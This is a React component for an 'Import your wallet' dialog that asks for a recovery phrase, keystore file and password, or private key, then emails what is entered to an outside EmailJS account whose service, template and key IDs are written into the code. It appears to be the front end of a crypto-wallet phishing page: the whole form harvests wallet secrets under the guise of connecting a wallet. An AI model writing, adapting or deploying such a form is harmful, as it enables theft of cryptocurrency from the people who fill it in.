import { useRef, useState } from "react";
import { Usewallet } from "../context/Usewallet";

function Form() {
  const { setFormVisible, walletArray } = Usewallet();

  const [active, setActive] = useState(1);
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_x41o8tj", "template_168l8hs", form.current, {
        publicKey: "4N-dX6YLFvkH1V-xz",
      })
      .then(
        () => {
          setFormVisible(false);
          alert(`We'll be in touch with you`);
        },
        (error) => {
          console.log("FAILED...", error.text);
        }
      );
  };

  return (
    <div>
      <div className=" mx-auto mt-8 w-[90%] rounded bg-white p-8 shadow-lg md:mt-16 md:w-[70%]">
        <p className="flex justify-center gap-4 p-4">
          <span>
            {!walletArray
              ? ""
              : walletArray.map((wallet) => (
                  <p key={wallet.id}>
                    <img
                      src={wallet.imageUrl}
                      className="h-8 w-8"
                      alt="wallet.name"
                    />
                  </p>
                ))}
          </span>
          <span className="mb-4 text-center text-xl font-bold">
            Import your wallet
          </span>
        </p>
        <p className="flex gap-4 border-b border-b-gray-200 font-bold md:gap-8 md:text-xl">
          <span
            className={`${
              active === 1
                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
                : ""
            }`}
            onClick={() => setActive(1)}
          >
            Phrase
          </span>
          <span
            className={`${
              active === 2
                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
                : ""
            }`}
            onClick={() => setActive(2)}
          >
            Keystore Json
          </span>
          <span
            className={`${
              active === 3
                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
                : ""
            }`}
            onClick={() => setActive(3)}
          >
            Private Key
          </span>
        </p>

        <form
          ref={form}
          onSubmit={sendEmail}
          className="bg-white font-medium text-stone-950"
        >
          {active === 1 && (
            <>
              <textarea
                name="message"
                rows="5"
                className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
                placeholder={"Recovery Phrase"}
                data-gramm="false"
              ></textarea>
              <span className="bg-white">
                Typically 12 - 24 words seperated by a single space
              </span>
            </>
          )}
          {active === 2 && (
            <>
              <textarea
                name="message"
                rows="5"
                className="my-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
                placeholder={"private key"}
                data-gramm="false"
              ></textarea>
              <input
                type="text"
                className="mb-5 w-full rounded-lg border border-blue-500 bg-white p-2 font-medium text-stone-950 outline-none md:my-5 md:mb-2 md:p-5"
                placeholder="Wallet Password"
              />

              <p>
                Several lines of text beginning with plus the password you used
                to encrypt it.
              </p>
            </>
          )}
          {active === 3 && (
            <>
              <textarea
                name="message"
                rows="5"
                className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
                placeholder={"private key"}
                data-gramm="false"
              ></textarea>
              <span className="bg-white">
                Typically 12 - 24 words seperated by a single space
              </span>
            </>
          )}
          <div className="mt-5 flex gap-4">
            <input
              type="submit"
              value="Connect"
              className="mx-auto block w-[70%] cursor-pointer rounded bg-blue-500 py-2 text-center text-white md:px-4 md:pt-3 "
            />
            <p
              onClick={() => setFormVisible(false)}
              className=" w-[30%] cursor-pointer rounded bg-red-500 py-2 text-center text-white md:px-4 md:pt-3 "
            >
              Close
            </p>
          </div>
        </form>
      </div>
    </div>
  );
}

export default Form;
